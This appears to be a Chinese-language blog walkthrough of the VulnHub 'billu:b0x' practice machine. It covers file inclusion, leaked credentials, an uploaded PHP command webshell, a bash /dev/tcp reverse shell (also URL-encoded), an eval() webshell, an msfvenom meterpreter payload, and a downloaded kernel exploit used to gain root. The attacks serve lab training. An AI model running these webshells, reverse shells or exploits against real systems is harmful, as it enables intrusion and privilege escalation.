@@ -1,0 +1,412 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>billu:b0x_1靶机练习 | dummersoul's Blog</title><meta name="keywords" content="靶机,vulnhub,内网提权"><meta name="author" content="dummersoul"><meta name="copyright" content="dummersoul"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="description" content="主机发现netdiscover  arp-scan -l 这个贼快  端口扫描 sql注入 提示了sql注入 但是抓包sqlmap -r 1.txt –level&#x3D;5 -dbs 也没有任何东西。无奈 扫描目录–dirb123cd &#x2F;usr&#x2F;share&#x2F;dirb&#x2F;wordlistslsdirb http:&#x2F;&#x2F;192.168.56.107 .">
+<meta property="og:type" content="article">
+<meta property="og:title" content="billu:b0x_1靶机练习">
+<meta property="og:url" content="https://dummersoul.github.io/2023/11/28/billu%20b0x_1%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/index.html">
+<meta property="og:site_name" content="dummersoul&#39;s Blog">
+<meta property="og:description" content="主机发现netdiscover  arp-scan -l 这个贼快  端口扫描 sql注入 提示了sql注入 但是抓包sqlmap -r 1.txt –level&#x3D;5 -dbs 也没有任何东西。无奈 扫描目录–dirb123cd &#x2F;usr&#x2F;share&#x2F;dirb&#x2F;wordlistslsdirb http:&#x2F;&#x2F;192.168.56.107 .">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://dummersoul.github.io/img/luffy_shanks.png">
+<meta property="article:published_time" content="2023-11-28T08:48:58.464Z">
+<meta property="article:modified_time" content="2021-01-28T03:40:06.000Z">
+<meta property="article:author" content="dummersoul">
+<meta property="article:tag" content="靶机">
+<meta property="article:tag" content="vulnhub">
+<meta property="article:tag" content="内网提权">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://dummersoul.github.io/img/luffy_shanks.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://dummersoul.github.io/2023/11/28/billu%20b0x_1%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//fonts.googleapis.com" crossorigin="crossorigin"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="preconnect" href="//zz.bdstatic.com"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Titillium+Web&amp;display=swap"><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  ClickShowText: undefined,
+  lightbox: 'fancybox',
+  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#121212","position":"bottom-left"},
+  justifiedGallery: {
+    js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+    css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+};
+
+var saveToLocal = {
+  set: function setWithExpiry(key, value, ttl) {
+    const now = new Date()
+    const expiryDay = ttl * 86400000
+    const item = {
+      value: value,
+      expiry: now.getTime() + expiryDay,
+    }
+    localStorage.setItem(key, JSON.stringify(item))
+  },
+
+  get: function getWithExpiry(key) {
+    const itemStr = localStorage.getItem(key)
+
+    if (!itemStr) {
+      return undefined
+    }
+    const item = JSON.parse(itemStr)
+    const now = new Date()
+
+    if (now.getTime() > item.expiry) {
+      localStorage.removeItem(key)
+      return undefined
+    }
+    return item.value
+  }
+}</script><script id="config_change">var GLOBAL_CONFIG_SITE = { 
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2021-01-28 11:40:06'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(function () {  window.activateDarkMode = function () {
+    document.documentElement.setAttribute('data-theme', 'dark')
+    if (document.querySelector('meta[name="theme-color"]') !== null) {
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+    }
+  }
+  window.activateLightMode = function () {
+    document.documentElement.setAttribute('data-theme', 'light')
+   if (document.querySelector('meta[name="theme-color"]') !== null) {
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+    }
+  }
+  const autoChangeMode = 'false'
+  const t = saveToLocal.get('theme')
+  if (autoChangeMode === '1') {
+    const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
+    const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
+    const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
+    const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+    if (t === undefined) {
+      if (isLightMode) activateLightMode()
+      else if (isDarkMode) activateDarkMode()
+      else if (isNotSpecified || hasNoSupport) {
+        const now = new Date()
+        const hour = now.getHours()
+        const isNight = hour <= 6 || hour >= 18
+        isNight ? activateDarkMode() : activateLightMode()
+      }
+      window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
+        if (saveToLocal.get('theme') === undefined) {
+          e.matches ? activateDarkMode() : activateLightMode()
+        }
+      })
+    } else if (t === 'light') activateLightMode()
+    else activateDarkMode()
+  } else if (autoChangeMode === '2') {
+    const now = new Date()
+    const hour = now.getHours()
+    const isNight = hour <= 6 || hour >= 18
+    if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
+    else if (t === 'light') activateLightMode()
+    else activateDarkMode()
+  } else {
+    if (t === 'dark') activateDarkMode()
+    else if (t === 'light') activateLightMode()
+  }const asideStatus = saveToLocal.get('aside-status')
+if (asideStatus !== undefined) {
+   if (asideStatus === 'hide') {
+     document.documentElement.classList.add('hide-aside')
+   } else {
+     document.documentElement.classList.remove('hide-aside')
+   }
+}})()</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/HCLonely/images@master/others/heartbeat.min.css"><meta name="generator" content="Hexo 5.2.0"><link rel="alternate" href="/atom.xml" title="dummersoul's Blog" type="application/atom+xml">
+</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src="/img/dummersoul.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">60</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">34</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 好友链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我</span></a></div></div></div></div><div id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/luffy_shanks.png)"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">dummersoul's Blog</a></span><span id="menus"><div id="search_button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 好友链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我</span></a></div></div><span class="close" id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></span></span></nav><div id="post-info"><h1 class="post-title">billu:b0x_1靶机练习</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-11-28T08:48:58.464Z" title="发表于 2023-11-28 16:48:58">2023-11-28</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-01-28T03:40:06.000Z" title="更新于 2021-01-28 11:40:06">2021-01-28</time></span></div><div class="meta-secondline"> <span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h2><p><code>netdiscover</code></p>
+<p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210106091051027.png" alt="image-20210106091051027"></p>
+<p><code>arp-scan -l</code> 这个贼快</p>
+<p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210106214353025.png" alt="image-20210106214353025"></p>
+<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210106091109262.png" alt="image-20210106091109262"></p>
+<h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210106091203450.png" alt="image-20210106091203450"></p>
+<p>提示了sql注入</p>
+<p>但是抓包sqlmap -r 1.txt –level=5 -dbs 也没有任何东西。无奈</p>
+<h2 id="扫描目录–dirb"><a href="#扫描目录–dirb" class="headerlink" title="扫描目录–dirb"></a>扫描目录–dirb</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;usr&#x2F;share&#x2F;dirb&#x2F;wordlists</span><br><span class="line">ls</span><br><span class="line">dirb http:&#x2F;&#x2F;192.168.56.107 .&#x2F;big.txt</span><br></pre></td></tr></table></figure>
+
+<p>之前没怎么用过这个工具，一直用的御剑，今儿用了才发现，还是用的大字典，结果那叫一个<strong>快准狠</strong>！！爱了爱了！！！</p>
+<p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210106100040327.png" alt="image-20210106100040327"></p>
+<p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210106100302925.png" alt="image-20210106100302925"></p>
+<p>这几个目录都很有用，其中有一个phpmyadmin 还不知道账户密码</p>
+<p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210106100345427.png" alt="image-20210106100345427"></p>
+<p>文件上传</p>
+<p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210106092841771.png" alt="image-20210106092841771"></p>
+<p>结果发现上传的文件并没在/images/目录和/uploaded_images/目录里出现</p>
+<p>仅仅是前端的上传页面，不能传东西</p>
+<h2 id="探针信息"><a href="#探针信息" class="headerlink" title="探针信息"></a>探针信息</h2><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210106093922886.png" alt="image-20210106093922886"></p>
+<p>可以知道网站根目录的位置</p>
+<h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210106093119055.png" alt="image-20210106093119055"></p>
+<p>这个像个文件包含</p>
+<p>post添加file参数</p>
+<p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210106094225729.png" alt="image-20210106094225729"></p>
+<p>成功下载文件，再利用这种方式下载其他文件，探测信息</p>
+<p>又下载了一个扫到的c.php 发现 mysql 的账号<code>billu</code> 密码<code>b0x_billu</code> ，这不是有账户密码了吗，直接登录phpmyadmin</p>
+<p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210106094416305.png" alt="image-20210106094416305"></p>
+<blockquote>
+<p>还可以再下载index.php 代码审计一下怎么绕过sql注入吧（现在还不会</p>
+</blockquote>
+<h2 id="phpmyadmin"><a href="#phpmyadmin" class="headerlink" title="phpmyadmin"></a>phpmyadmin</h2><p>billu,b0x_billu</p>
+<p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210106102328383.png" alt="image-20210106102328383"></p>
+<p>利用找到的 biLLu，hEx_it。 去登录index.php</p>
+<p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210106102424686.png" alt="image-20210106102424686"></p>
+<p>登录跳转到<a target="_blank" rel="noopener" href="http://192.168.56.107/panel.php">http://192.168.56.107/panel.php</a></p>
+<p>用文件包含的方式下载这个源码，代码审计</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">if(isset($_POST[&#39;continue&#39;]))</span><br><span class="line">&#123;</span><br><span class="line">	$dir&#x3D;getcwd();</span><br><span class="line">	$choice&#x3D;str_replace(&#39;.&#x2F;&#39;,&#39;&#39;,$_POST[&#39;load&#39;]);</span><br><span class="line">	</span><br><span class="line">	if($choice&#x3D;&#x3D;&#x3D;&#39;add&#39;)</span><br><span class="line">	&#123;</span><br><span class="line">       		include($dir.&#39;&#x2F;&#39;.$choice.&#39;.php&#39;);</span><br><span class="line">			die();</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">        if($choice&#x3D;&#x3D;&#x3D;&#39;show&#39;)</span><br><span class="line">	&#123;</span><br><span class="line">        </span><br><span class="line">		include($dir.&#39;&#x2F;&#39;.$choice.&#39;.php&#39;);</span><br><span class="line">		die();</span><br><span class="line">	&#125;</span><br><span class="line">	else</span><br><span class="line">	&#123;</span><br><span class="line">		include($dir.&#39;&#x2F;&#39;.$_POST[&#39;load&#39;]);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>发现panel.php存在本地文件包含漏洞</p>
+<h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210106102522573.png" alt="image-20210106102522573"></p>
+<p>选择add user 又出现了刚才的文件上传页面，难道必须在这个页面才能上传成功吗，再试试</p>
+<p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210106102654670.png" alt="image-20210106102654670"></p>
+<p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210106103152325.png" alt="image-20210106103152325"></p>
+<p>上传了一个图片马</p>
+<p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210106102852717.png" alt="image-20210106102852717"></p>
+<p>在<a target="_blank" rel="noopener" href="http://192.168.56.107/uploaded_images/">http://192.168.56.107/uploaded_images/</a> 查看一下，还真有诶</p>
+<p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210106102918904.png" alt="image-20210106102918904"></p>
+<p>然后没办法啊，前面那些都是post请求，没办法，换思路</p>
+<p>上传一个一句话cmd命令马</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89</span><br><span class="line">&lt;?php system($_GET[&#39;cmd&#39;]);?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>上传后，点击show users 抓包，然后修改load的位置为上传图片马的位置</p>
+<p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210106154036290.png" alt="image-20210106154036290"></p>
+<p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210106153454012.png" alt="image-20210106153454012"></p>
+<p>结果发现咋没有呢</p>
+<p>后来再看，发现是cat /etc/passwd 中间的空格没有解析，应该把空格换成%20</p>
+<blockquote>
+<p>post请求url中加入执行命令的参数：POST /panel.php?cmd=cat%20/etc/passwd</p>
+<p>post的body中包含cmd.jpg图片马：load=/uploaded_images/cmd.jpg&amp;continue=continue</p>
+<p>成功执行命令cat /etc/passwd</p>
+</blockquote>
+<p>或者直接hackbar修改，更方便</p>
+<p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210106170738658.png" alt="image-20210106170738658"></p>
+<h2 id="bash反弹shell"><a href="#bash反弹shell" class="headerlink" title="bash反弹shell"></a>bash反弹shell</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.56.123&#x2F;4444 0&gt;&amp;1&quot; | bash</span><br></pre></td></tr></table></figure>
+
+<p>url编码后</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%65%63%68%6f%20%22%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%39%32%2e%31%36%38%2e%35%36%2e%31%32%33%2f%34%34%34%34%20%30%3e%26%31%22%20%7c%20%62%61%73%68</span><br></pre></td></tr></table></figure>
+
+<p>在post的url中将执行的命令换成可以反弹shell的</p>
+<p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210106155126898.png" alt="image-20210106155126898"></p>
+<p>与此同时，在192.168.56.123监听</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 4444</span><br></pre></td></tr></table></figure>
+
+<p>成功getshell</p>
+<h2 id="菜刀弹shell"><a href="#菜刀弹shell" class="headerlink" title="菜刀弹shell"></a>菜刀弹shell</h2><p>通过刚才上一步cmd马执行命令，执行ls -al 发现uploaded_images目录具有可写权限</p>
+<p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210106170957038.png" alt="image-20210106170957038"></p>
+<p>那可以写个马进去直接连啊</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.56.107&#x2F;panel.php?cmd&#x3D;echo &#39;&lt;?php eval($_POST[&#39;pass&#39;]);?&gt;&#39;123 &gt;&gt; uploaded_images&#x2F;shell.php</span><br><span class="line">load&#x3D;&#x2F;uploaded_images&#x2F;cmd.jpg&amp;continue&#x3D;continue</span><br></pre></td></tr></table></figure>
+
+<p>查看是否创建成功</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.56.107&#x2F;panel.php?cmd&#x3D;cat uploaded_images&#x2F;shell.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210106171918315.png" alt="image-20210106171918315"></p>
+<p>有我加的123，说明执行成功</p>
+<p>直接访问也有123</p>
+<p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210106172629694.png" alt="image-20210106172629694"></p>
+<p>菜刀上<a target="_blank" rel="noopener" href="http://192.168.56.107/uploaded_images/shell.php%EF%BC%8C%E5%AF%86%E7%A0%81%60pass%60">http://192.168.56.107/uploaded_images/shell.php，密码`pass`</a></p>
+<p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210106172537987.png" alt="image-20210106172537987"></p>
+<h2 id="nc-getshell后提权"><a href="#nc-getshell后提权" class="headerlink" title="nc getshell后提权"></a>nc getshell后提权</h2><p>getshell之后是一个普通用户权限，要想办法提权，linux提权有多种方式，有脏牛, 环境变量提权, 内核提权,命令提权等</p>
+<h3 id="内核提权"><a href="#内核提权" class="headerlink" title="内核提权"></a>内核提权</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname -a #查看内核版本 : 3.13.0-32-generic</span><br><span class="line">cat &#x2F;etc&#x2F;issue #查看系统版本 ： Ubuntu 12.04.5 </span><br></pre></td></tr></table></figure>
+
+<h4 id="搜索exp"><a href="#搜索exp" class="headerlink" title="搜索exp"></a>搜索exp</h4><p>可以直接在kali中搜关键词</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">searchsploit 3.13.0</span><br><span class="line">searchsploit Ubuntu 12.04.5 </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210106150611184.png" alt="image-20210106150611184"></p>
+<p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210106150644543.png" alt="image-20210106150644543"></p>
+<p>将exp拷贝到根路径下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp &#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;exploits&#x2F;linux&#x2F;local&#x2F;37292.c &#x2F;root&#x2F;</span><br></pre></td></tr></table></figure>
+
+<p>如果加参数-w 显示网址</p>
+<p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210106151936918.png" alt="image-20210106151936918"></p>
+<h4 id="执行exp"><a href="#执行exp" class="headerlink" title="执行exp"></a>执行exp</h4><p>先下载到靶机上，再修改权限，再编译，再执行（下载文件这一步，如果访问不了公网，可以写个一句话木马连接，先在kali下下载好，再传exp进去，也可以用kali上开启服务器的方式python -m SimpleHTTPServer，默认8000端口）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wget https:&#x2F;&#x2F;www.exploit-db.com&#x2F;exploits&#x2F;37292</span><br><span class="line">chmod 777 37292.c </span><br><span class="line">gcc 37292.c -o exp    </span><br><span class="line">.&#x2F;exp  </span><br></pre></td></tr></table></figure>
+
+<p>执行完就root权限了</p>
+<blockquote>
+<p>需要注意一点，有的服务器并不允许使用 <code>gcc</code> 编译，那么就需要准备一台和需要提权版本一样的虚拟机，在虚拟机里面编译好之后再上传。（这其实还蛮难搞的，版本要一模一样应该不好找吧，不行就在靶机现场安装gcc，如果没有安装权限的话，那就只能找一个一样的虚拟机编译了，又找不到其他提权方法的话，这真的是最后最后的选择了<img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/064FE0FA.gif" alt="img"></p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210106160512009.png" alt="image-20210106160512009"></p>
+<p>那如果不提权，直接切换成root用户呢， 反正也获取到root密码了</p>
+<p>结果提示su:must be run from a terminal</p>
+<p>需要先输入命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#39;import pty;pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br></pre></td></tr></table></figure>
+
+<p>再重新切换一次root就行了</p>
+<p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210106164027715.png" alt="image-20210106164027715"></p>
+<h2 id="菜刀下提权"><a href="#菜刀下提权" class="headerlink" title="菜刀下提权"></a>菜刀下提权</h2><p>刚才利用菜刀获取shell的方式可以提权吗？试一试</p>
+<p>用虚拟终端打开，直接执行存在/tmp下的exp,结果不行</p>
+<p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210106173038806.png" alt="image-20210106173038806"></p>
+<p>那就在菜刀上再反弹一个shell,这次我nc反弹，kali监听，嘿，真就弹过来了啊，再定位到/tmp下执行exp就提权成功了(๑′ᴗ‵๑)</p>
+<h2 id="msf反弹shell"><a href="#msf反弹shell" class="headerlink" title="msf反弹shell"></a>msf反弹shell</h2><p>练习一下msf弹shell把，虽然没有nc、bash、telnet方法来的快，但也不能不会啊，说不定出现个啥环境就不能用这些命令呢，而且msf可以生成持久性的后门。</p>
+<p>先在kali下生成个木马</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.56.123 -f raw &gt;&#x2F;root&#x2F;sha.php</span><br></pre></td></tr></table></figure>
+
+<p>开启msf配置监听器</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">set lhost 192.168.56.123</span><br><span class="line">set payload php&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">exploit -j -z   后台监听</span><br></pre></td></tr></table></figure>
+
+<p>将生成的sha.php放到uploaded_images下,访问进行解析</p>
+<p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210106175526266.png" alt="image-20210106175526266"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sessions</span><br><span class="line">sessions 1</span><br><span class="line">shell</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210106175916421.png" alt="image-20210106175916421"></p>
+<p>再用exp提权，跟前面的步骤一样，没有/bin/bash环境，再用<code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code>添加一次就行了</p>
+<p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210106180114390.png" alt="image-20210106180114390"></p>
+<h2 id="config-inc-php"><a href="#config-inc-php" class="headerlink" title="config.inc.php"></a>config.inc.php</h2><p>由phpmyadmin猜测会不会有<code>config.inc.php</code> 文件，结果真有</p>
+<p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210106101832116.png" alt="image-20210106101832116"></p>
+<p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210106101900168.png" alt="image-20210106101900168"></p>
+<p>这样不就可以直接ssh登录了吗，提权这一步都免了</p>
+<p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210106103304800.png" alt="image-20210106103304800"></p>
+<h2 id="phpmyadmin到getshell"><a href="#phpmyadmin到getshell" class="headerlink" title="phpmyadmin到getshell"></a>phpmyadmin到getshell</h2><p><a target="_blank" rel="noopener" href="https://dummersoul.top/2021/01/28/phpmyadmin%E8%8E%B7%E5%8F%96shell/">phpmyadmin获取shell</a></p>
+<h2 id="etc-shadow解密码"><a href="#etc-shadow解密码" class="headerlink" title="/etc/shadow解密码"></a>/etc/shadow解密码</h2><p>有了root权限后，再自己搞点好玩的</p>
+<p>查看/etc/shadow文件，发现最后一行有个用户ica，想获取他的ssh密码</p>
